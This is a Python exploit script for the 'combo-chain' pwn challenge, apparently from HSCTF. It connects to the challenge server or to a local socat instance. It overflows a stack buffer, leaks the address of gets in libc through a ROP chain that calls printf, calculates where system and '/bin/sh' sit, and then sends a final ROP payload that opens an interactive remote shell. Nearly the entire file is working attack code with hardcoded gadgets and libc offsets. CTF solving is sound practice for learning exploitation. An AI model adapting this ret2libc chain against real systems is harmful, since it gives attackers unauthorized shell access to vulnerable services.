#!/usr/bin/env python3
import socket
import telnetlib
import string
import struct

SERVER = True

def p64(x):
    return struct.pack("<Q", x)

# Connect to program
s = socket.socket()
if SERVER:
    s.connect(('pwn.hsctf.com', 2345))
else:
    # host locally:
    # socat TCP-LISTEN:2323,reuseaddr,fork EXEC:./combo-chain
    # while true; do socat TCP-LISTEN:2323,reuseaddr,fork EXEC:"strace -f ./combo-chain"; done
    s.connect(('127.0.0.1', 2323))
t = telnetlib.Telnet()
t.sock = s

# Define addresses
printf_got = 0x404028
printf_plt = 0x401050
gadget_poprdi = 0x401263
main_addr = 0x4011a4
gets_plt = 0x401060
gets_got = 0x404030

if SERVER:
    # Server offsets
    # https://libc.blukat.me/d/libc6_2.23-0ubuntu11_amd64.symbols
    libc_offset_gets = 0x06ed80
    libc_offset_printf = 0x055800
    libc_offset_system = 0x045390
    libc_offset_binsh = 0x18cd57
else:
    # Local offsets
    libc_offset_gets = 0x071040
    libc_offset_printf = 0x058560
    libc_offset_system = 0x0449c0
    libc_offset_binsh = 0x181519


padding = b"A"*16 

# No idea why, but we must submit a dummy ROP before we can leak LIBC
buf = padding
buf += p64(main_addr)
buf += p64(main_addr)
print(t.read_until(b'Enter the right combo for some COMBO CARNAGE!: '))
t.write(buf + b'\n')

# Leak libc
buf = padding
buf += struct.pack("<Q", gadget_poprdi)
buf += struct.pack("<Q", gets_got) # printf_got did not work on server
buf += struct.pack("<Q", printf_plt)
buf += struct.pack("<Q", main_addr)
print(t.read_until(b'Enter the right combo for some COMBO CARNAGE!: '))
t.write(buf + b'\n')

# Calculate libbc
gets_libc = t.read_until(b'Dude')[:-4]
print('[!] Leaked gets@libc:', gets_libc)

gets_libc = int.from_bytes(gets_libc, "little")
print('[!] Leaked gets@libc:', hex(gets_libc))

system_libc = gets_libc - libc_offset_gets + libc_offset_system
print('[!] Calculate system@libc:', hex(system_libc))

binsh_libc = gets_libc - libc_offset_gets + libc_offset_binsh
print('[!] Calculate binsh@libc:', hex(binsh_libc))

# Send payload
buf = padding
buf += struct.pack("<Q", gadget_poprdi)
buf += struct.pack("<Q", binsh_libc)
buf += struct.pack("<Q", system_libc)
buf += struct.pack("<Q", main_addr)
print(t.read_until(b'Enter the right combo for some COMBO CARNAGE!: '))
t.write(buf + b'\n')

t.interact()
